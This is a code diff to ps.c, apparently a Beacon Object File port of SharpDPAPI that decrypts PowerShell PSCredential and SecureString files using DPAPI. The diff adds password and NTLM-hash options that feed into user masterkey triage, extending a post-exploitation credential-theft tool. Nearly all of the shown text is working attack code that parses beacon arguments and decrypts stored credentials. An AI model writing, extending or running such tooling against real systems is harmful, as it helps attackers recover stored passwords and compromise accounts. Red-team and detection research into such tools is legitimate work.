@@ -2,7 +2,8 @@
  * ps.c — BOF for PowerShell SecureString / PSCredential decryption
  *
  * Usage:
- *   ps /target:FILE [/pvk:BASE64] [/credkey:KEY] [/unprotect] [/rpc]
+ *   ps /target:FILE [/pvk:BASE64] [/password:PASS] [/ntlm:HASH]
+ *      [/credkey:KEY] [/unprotect] [/rpc]
  *
  * Decrypts PowerShell Export-Clixml PSCredential files and
  * ConvertFrom-SecureString output using DPAPI.
@@ -19,13 +20,16 @@ void go(char* args, int args_len) {
 
     char* target_str = BeaconDataExtract(&parser, NULL);
     char* pvk_b64    = BeaconDataExtract(&parser, NULL);
+    char* password   = BeaconDataExtract(&parser, NULL);
+    char* ntlm       = BeaconDataExtract(&parser, NULL);
     char* credkey    = BeaconDataExtract(&parser, NULL);
     int   unprotect  = BeaconDataInt(&parser);
     int   use_rpc    = BeaconDataInt(&parser);
 
     if (!target_str || strlen(target_str) == 0) {
         BeaconPrintf(CALLBACK_ERROR,
-            "[!] Usage: ps /target:CRED_FILE [/pvk:BASE64] [/credkey:KEY] [/unprotect]\n");
+            "[!] Usage: ps /target:CRED_FILE [/pvk:BASE64] [/password:PASS] "
+            "[/ntlm:HASH] [/credkey:KEY] [/unprotect] [/rpc]\n");
         return;
     }
 
@@ -67,10 +71,14 @@ void go(char* args, int args_len) {
         }
     }
 
-    /* Triage masterkeys if PVK provided */
-    if (pvk || use_rpc) {
+    /* Triage masterkeys if pvk/password/ntlm/rpc provided */
+    if (pvk || use_rpc ||
+        (password && strlen(password) > 0) ||
+        (ntlm && strlen(ntlm) > 0)) {
         triage_user_masterkeys(&cache, pvk, pvk_len,
-            NULL, NULL, NULL, (BOOL)use_rpc, NULL, NULL, FALSE, NULL);
+            (password && strlen(password) > 0) ? password : NULL,
+            (ntlm && strlen(ntlm) > 0) ? ntlm : NULL,
+            NULL, (BOOL)use_rpc, NULL, NULL, FALSE, NULL);
     }
 
     BeaconPrintf(CALLBACK_OUTPUT, "\n=== SharpDPAPI PSCredential (BOF) ===\n");
